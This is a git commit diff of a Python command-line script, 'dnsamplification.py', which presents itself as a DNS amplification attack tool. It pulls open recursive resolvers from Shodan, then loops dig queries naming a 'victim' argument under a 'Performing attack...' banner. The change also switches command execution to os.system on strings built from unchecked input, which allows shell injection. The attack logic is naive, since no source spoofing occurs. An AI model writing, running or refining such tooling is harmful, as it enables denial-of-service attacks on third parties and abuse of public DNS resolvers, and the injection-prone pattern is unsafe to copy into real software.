62b40d66b38c30f55dfa57c64f7f91476d3b8e3d
Pierpaolo Sestito <112246529+pierpaolosestito-dev@users.noreply.github.com>
2023-02-06 19:36:36 +0100

    updated dnsamplification

--- dnsamplification.py
+++ dnsamplification.py
@@ -1,12 +1,14 @@
+
+
 import typer
 import re
 import subprocess
+import os
 from rich.console import Console
 from time import sleep
 
 def subprocess_call_commands(command):
-    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
-    output, error = process.communicate()
+    os.system(command)
 
 
 console = Console() 
@@ -14,26 +16,28 @@ console = Console()
 
 def main(api_key: str,victim:str):
     #Initialize
-    initCommand = "shodan init " + api_key + "> /dev/null 2>&1"
+    initCommand = "shodan init " + api_key + " > /dev/null 2>&1"
     subprocess_call_commands(initCommand)
-
-    #Search DNS Resolvers through Shodan API
-    searchCommand = 'shodan download DNS-Resolvers "Recursion: enabled" > /dev/null 2>&1'
-    subprocess_call_commands(searchCommand)
-
+    
+    with console.status("[bold green]Discovering DNS...[/bold green]"):
+    	searchCommand = 'shodan download DNS-Resolvers "Recursion: enabled" > /dev/null 2>&1'
+    	subprocess_call_commands(searchCommand)
+   	
     parseIPCommand = 'shodan parse --fields ip_str DNS-Resolvers.json.gz > /dev/null 2>&1 > DNS-Resolvers.txt'
     subprocess_call_commands(parseIPCommand)
-
-    #Delete DNS-Resolvers.json.gz
+      
+   #Delete DNS-Resolvers.json.gz
     subprocess_call_commands("rm DNS-Resolvers.json.gz")
 
-    with console.status("[bold green]Decrypting string...[/bold green]"):
-        sleep(1)
+    with console.status("[bold red]Performing attack...[/bold red]"):
         with open('DNS-Resolvers.txt') as f:
             contents = f.readlines()
             for i in contents:
                 attackCommand = "dig " + victim + " " + i + "> /dev/null 2>&1"
                 subprocess_call_commands(attackCommand)
+    
+
+ 
 
 
 
